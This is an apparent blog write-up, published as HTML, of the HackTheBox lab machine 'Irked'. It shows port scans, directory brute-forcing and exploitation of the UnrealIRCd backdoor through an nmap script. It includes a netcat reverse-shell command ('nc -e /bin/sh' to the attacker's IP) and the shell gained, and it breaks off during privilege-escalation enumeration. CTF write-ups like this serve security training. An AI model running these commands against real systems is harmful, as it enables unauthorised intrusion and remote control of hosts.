@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  HTB: Irked Writeup · mattjohnson.cloud
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="matt johnson">
+<meta name="description" content="Here&#39;s how to solve HackTheBox&#39;s Irked.">
+<meta name="keywords" content="blog,cloud,personal,security,windows,chess">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: Irked Writeup">
+  <meta name="twitter:description" content="Here&#39;s how to solve HackTheBox&#39;s Irked.">
+
+<meta property="og:url" content="http://www.mattjohnson.de/posts/htb-irked/">
+  <meta property="og:site_name" content="mattjohnson.cloud">
+  <meta property="og:title" content="HTB: Irked Writeup">
+  <meta property="og:description" content="Here&#39;s how to solve HackTheBox&#39;s Irked.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-05-04T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-05-04T00:00:00+00:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Security">
+
+
+
+
+<link rel="canonical" href="http://www.mattjohnson.de/posts/htb-irked/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.7763f8bc6341ecf82378e867c285e1549abb063a899be313ccd25dbfcd24fa7d.css" integrity="sha256-d2P4vGNB7PgjeOhnwoXhVJq7BjqJm&#43;MTzNJdv80k&#43;n0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://www.mattjohnson.de/">
+      mattjohnson.cloud
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">about</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tags/">tags</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://www.mattjohnson.de/posts/htb-irked/">
+              HTB: Irked Writeup
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2020-05-04T00:00:00Z">
+                May 4, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              9-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/matt-johnson/">Matt Johnson</a></div>
+
+          
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/hackthebox/">Hackthebox</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/security/">Security</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <div class="custom-toc">
+    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#high-level-information">High-Level Information</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ol>
+</nav>
+</div>
+<h1 id="high-level-information">
+  High-Level Information
+  <a class="heading-link" href="#high-level-information">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Machine Name: Irked</p>
+<p>IP Address: 10.10.10.117</p>
+<p>Difficulty: Easy</p>
+<p>Summary: HackTheBox&rsquo;s Irked was a simple machine with a fun, steganographic twist. In order to get an initial low shell on the system, one needs to exploit a backdoor in UnrealIRCd. Once on the box, there is a file called &lsquo;.backup&rsquo; in the &lsquo;djmardov&rsquo; user&rsquo;s home directory that hints at their password being hidden in an image. Using steghide, the user password can be derived from an image on the web server&rsquo;s index page. As &lsquo;djmardov&rsquo;, one then has permission to write to a file executed by a custom SUID program, which can be exploited to get a root shell.</p>
+<p>Tools Used: Nmap, Gobuster, Tcpdump, Netcat, Steghide</p>
+<h1 id="initial-foothold">
+  Initial Foothold
+  <a class="heading-link" href="#initial-foothold">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/htb/irked$ sudo /opt/stagednmap.sh 10.10.10.117
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>sudo<span style="color:#ff7b72;font-weight:bold">]</span> password <span style="color:#ff7b72">for</span> matt:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2020-05-03 10:03 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.10.10.117
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.13s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#a5d6ff">65528</span> closed ports
+</span></span><span style="display:flex;"><span>PORT STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open ssh
+</span></span><span style="display:flex;"><span>80/tcp open http
+</span></span><span style="display:flex;"><span>111/tcp open rpcbind
+</span></span><span style="display:flex;"><span>6697/tcp open ircs-u
+</span></span><span style="display:flex;"><span>8067/tcp open infi-async
+</span></span><span style="display:flex;"><span>54751/tcp open unknown
+</span></span><span style="display:flex;"><span>65534/tcp open unknown
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 316.24 seconds
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2020-05-03 10:08 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.10.10.117
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.13s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>PORT STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 <span style="color:#ff7b72;font-weight:bold">(</span>protocol 2.0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>| <span style="color:#a5d6ff">1024</span> 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad <span style="color:#ff7b72;font-weight:bold">(</span>DSA<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#a5d6ff">2048</span> 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 <span style="color:#ff7b72;font-weight:bold">(</span>RSA<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#a5d6ff">256</span> c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b <span style="color:#ff7b72;font-weight:bold">(</span>ECDSA<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_ <span style="color:#a5d6ff">256</span> 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c <span style="color:#ff7b72;font-weight:bold">(</span>ED25519<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open http Apache httpd 2.4.10 <span style="color:#ff7b72;font-weight:bold">((</span>Debian<span style="color:#ff7b72;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.10 <span style="color:#ff7b72;font-weight:bold">(</span>Debian<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#f85149">&#39;</span>t have a title <span style="color:#ff7b72;font-weight:bold">(</span>text/html<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>111/tcp open rpcbind 2-4 <span style="color:#ff7b72;font-weight:bold">(</span>RPC <span style="color:#8b949e;font-style:italic">#100000)</span>
+</span></span><span style="display:flex;"><span>| rpcinfo:
+</span></span><span style="display:flex;"><span>| program version port/proto service
+</span></span><span style="display:flex;"><span>| <span style="color:#a5d6ff">100000</span> 2,3,4 111/tcp rpcbind
+</span></span><span style="display:flex;"><span>| <span style="color:#a5d6ff">100000</span> 2,3,4 111/udp rpcbind
+</span></span><span style="display:flex;"><span>| <span style="color:#a5d6ff">100000</span> 3,4 111/tcp6 rpcbind
+</span></span><span style="display:flex;"><span>| <span style="color:#a5d6ff">100000</span> 3,4 111/udp6 rpcbind
+</span></span><span style="display:flex;"><span>| <span style="color:#a5d6ff">100024</span> <span style="color:#a5d6ff">1</span> 50726/udp status
+</span></span><span style="display:flex;"><span>| <span style="color:#a5d6ff">100024</span> <span style="color:#a5d6ff">1</span> 51484/udp6 status
+</span></span><span style="display:flex;"><span>| <span style="color:#a5d6ff">100024</span> <span style="color:#a5d6ff">1</span> 54751/tcp status
+</span></span><span style="display:flex;"><span>|_ <span style="color:#a5d6ff">100024</span> <span style="color:#a5d6ff">1</span> 60159/tcp6 status
+</span></span><span style="display:flex;"><span>6697/tcp open irc UnrealIRCd
+</span></span><span style="display:flex;"><span>8067/tcp open irc UnrealIRCd
+</span></span><span style="display:flex;"><span>54751/tcp open status <span style="color:#a5d6ff">1</span> <span style="color:#ff7b72;font-weight:bold">(</span>RPC <span style="color:#8b949e;font-style:italic">#100024)</span>
+</span></span><span style="display:flex;"><span>65534/tcp open irc UnrealIRCd
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#a5d6ff">1</span> open and <span style="color:#a5d6ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Linux 3.12 <span style="color:#ff7b72;font-weight:bold">(</span>95%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 3.13 <span style="color:#ff7b72;font-weight:bold">(</span>95%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 3.2 - 4.9 <span style="color:#ff7b72;font-weight:bold">(</span>95%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 3.8 - 3.11 <span style="color:#ff7b72;font-weight:bold">(</span>95%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 4.4 <span style="color:#ff7b72;font-weight:bold">(</span>95%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 4.8 <span style="color:#ff7b72;font-weight:bold">(</span>95%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 4.9 <span style="color:#ff7b72;font-weight:bold">(</span>95%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 3.16 <span style="color:#ff7b72;font-weight:bold">(</span>95%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 3.18 <span style="color:#ff7b72;font-weight:bold">(</span>95%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 4.2 <span style="color:#ff7b72;font-weight:bold">(</span>95%<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#ff7b72">for</span> host <span style="color:#ff7b72;font-weight:bold">(</span>test conditions non-ideal<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#a5d6ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#ff7b72;font-weight:bold">(</span>using port 22/tcp<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>HOP RTT ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">1</span> 132.84 ms 10.10.14.1
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">2</span> 133.08 ms 10.10.10.117
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 85.93 seconds
+</span></span></code></pre></div><p>As is often the case, I began by enumerating the web server:</p>
+<p><img src="web-page-home.png" alt=""></p>
+<p><img src="web-page-404.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/htb/irked$ gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --threads <span style="color:#a5d6ff">50</span> --url http://10.10.10.117
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.0.1
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#ff7b72;font-weight:bold">(</span>@TheColonial<span style="color:#ff7b72;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#ff7b72;font-weight:bold">(</span>@_FireFart_<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Url: http://10.10.10.117
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Threads: <span style="color:#a5d6ff">50</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Status codes: 200,204,301,302,307,401,403
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> User Agent: gobuster/3.0.1
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Timeout: <span style="color:#79c0ff">10s</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span>2020/05/03 10:07:13 Starting <span style="color:#79c0ff">gobuster</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span>/manual <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/server-status <span style="color:#ff7b72;font-weight:bold">(</span>Status: 403<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span>2020/05/03 10:16:51 <span style="color:#79c0ff">Finished</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>      
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/irked$ 
+</span></span></code></pre></div><p>The web server appeared to be nothing more than an index page and some Apache documentation.</p>
+<p>After the web enumeration, I began enumerating UnrealIRCd and discovered that it had a backdoor that allowed remote code execution:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/htb/irked$ nmap -p6667 --script<span style="color:#ff7b72;font-weight:bold">=</span>irc-unrealircd-backdoor.nse --script-args<span style="color:#ff7b72;font-weight:bold">=</span>irc-unrealircd-backdoor.command<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;ping -c 2 10.10.14.17&#39;</span> 10.10.10.117
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2020-05-03 10:24 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.10.10.117
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.13s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>PORT STATE SERVICE
+</span></span><span style="display:flex;"><span>6667/tcp closed irc
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 0.85 seconds
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/irked$ nmap -p8067 --script<span style="color:#ff7b72;font-weight:bold">=</span>irc-unrealircd-backdoor.nse --script-args<span style="color:#ff7b72;font-weight:bold">=</span>irc-unrealircd-backdoor.command<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;ping -c 2 10.10.14.17&#39;</span> 10.10.10.117
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2020-05-03 10:25 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.10.10.117
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.18s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>PORT STATE SERVICE
+</span></span><span style="display:flex;"><span>8067/tcp open infi-async
+</span></span><span style="display:flex;"><span>|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 19.97 seconds
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/irked$ nmap -p65534 --script<span style="color:#ff7b72;font-weight:bold">=</span>irc-unrealircd-backdoor.nse --script-args<span style="color:#ff7b72;font-weight:bold">=</span>irc-unrealircd-backdoor.command<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;ping -c 2 10.10.14.17&#39;</span> 10.10.10.117
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2020-05-03 10:25 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.10.10.117
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.17s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>PORT STATE SERVICE
+</span></span><span style="display:flex;"><span>65534/tcp open unknown
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 0.79 seconds
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/irked$ 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/htb/irked$ sudo tcpdump -i tun0 icmp
+</span></span><span style="display:flex;"><span>tcpdump: verbose output suppressed, use -v or -vv <span style="color:#ff7b72">for</span> full protocol decode
+</span></span><span style="display:flex;"><span>listening on tun0, link-type RAW <span style="color:#ff7b72;font-weight:bold">(</span>Raw IP<span style="color:#ff7b72;font-weight:bold">)</span>, capture size <span style="color:#a5d6ff">262144</span> bytes
+</span></span><span style="display:flex;"><span>10:25:28.002204 IP 10.10.10.117 &gt; 10.10.14.17: ICMP echo request, id 1071, seq 1, length <span style="color:#a5d6ff">64</span>
+</span></span><span style="display:flex;"><span>10:25:28.002280 IP 10.10.14.17 &gt; 10.10.10.117: ICMP echo reply, id 1071, seq 1, length <span style="color:#a5d6ff">64</span>
+</span></span><span style="display:flex;"><span>10:25:29.036050 IP 10.10.10.117 &gt; 10.10.14.17: ICMP echo request, id 1071, seq 2, length <span style="color:#a5d6ff">64</span>
+</span></span><span style="display:flex;"><span>10:25:29.036111 IP 10.10.14.17 &gt; 10.10.10.117: ICMP echo reply, id 1071, seq 2, length <span style="color:#a5d6ff">64</span>
+</span></span><span style="display:flex;"><span>^C
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">4</span> packets captured
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">4</span> packets received by filter
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">0</span> packets dropped by kernel
+</span></span></code></pre></div><p>After confirming that I was able to get code execution on port 8067, I set up a netcat listener and got a low shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/htb/irked$ nmap -p8067 --script<span style="color:#ff7b72;font-weight:bold">=</span>irc-unrealircd-backdoor.nse --script-args<span style="color:#ff7b72;font-weight:bold">=</span>irc-unrealircd-backdoor.command<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;nc -e /bin/sh 10.10.14.17 80&#39;</span> 10.10.10.117
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2020-05-03 10:30 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.10.10.117
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.19s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>PORT STATE SERVICE
+</span></span><span style="display:flex;"><span>8067/tcp open infi-async
+</span></span><span style="display:flex;"><span>|_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to <span style="color:#a5d6ff">100</span> <span style="color:#ff7b72;font-weight:bold">(</span>or higher <span style="color:#ff7b72">if</span> you get this message again<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 23.52 seconds
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/htb/irked$ sudo nc -nvlp <span style="color:#a5d6ff">80</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#ff7b72;font-weight:bold">[</span>any<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">80</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#ff7b72;font-weight:bold">[</span>10.10.14.17<span style="color:#ff7b72;font-weight:bold">]</span> from <span style="color:#ff7b72;font-weight:bold">(</span>UNKNOWN<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>10.10.10.117<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">35579</span>
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>1001<span style="color:#ff7b72;font-weight:bold">(</span>ircd<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>1001<span style="color:#ff7b72;font-weight:bold">(</span>ircd<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>1001<span style="color:#ff7b72;font-weight:bold">(</span>ircd<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span></code></pre></div><h1 id="privilege-escalation">
+  Privilege Escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>I began my internal enumeration by running linPEAS, but didn&rsquo;t get too much information besides the fact that there was an SUID program called &lsquo;viewuser&rsquo;. Further manual enumeration led to me finding the user flag (which I was not able to view) and a hidden file called &lsquo;.backup&rsquo; (which I was able to view).</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ircd@irked:/home$ ls
+</span></span><span style="display:flex;"><span>djmardov ircd
+</span></span><span style="display:flex;"><span>ircd@irked:/home$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#a5d6ff">16</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#a5d6ff">4</span> root root <span style="color:#a5d6ff">4096</span> May <span style="color:#a5d6ff">14</span> <span style="color:#a5d6ff">2018</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#a5d6ff">21</span> root root <span style="color:#a5d6ff">4096</span> May <span style="color:#a5d6ff">15</span> <span style="color:#a5d6ff">2018</span> ..
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#a5d6ff">18</span> djmardov djmardov <span style="color:#a5d6ff">4096</span> Nov <span style="color:#a5d6ff">3</span> <span style="color:#a5d6ff">2018</span> djmardov
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#a5d6ff">3</span> ircd root <span style="color:#a5d6ff">4096</span> May <span style="color:#a5d6ff">15</span> <span style="color:#a5d6ff">2018</span> ircd
+</span></span><span style="display:flex;"><span>ircd@irked:/home$ cd djmardov
+</span></span><span style="display:flex;"><span>ircd@irked:/home/djmardov$ ls
+</span></span><span style="display:flex;"><span>Desktop Documents Downloads Music Pictures Public Templates Videos
+</span></span><span style="display:flex;"><span>ircd@irked:/home/djmardov$ cd Desktop
+</span></span><span style="display:flex;"><span>ircd@irked:/home/djmardov/Desktop$ ls
+</span></span><span style="display:flex;"><span>ircd@irked:/home/djmardov/Desktop$ ls -la
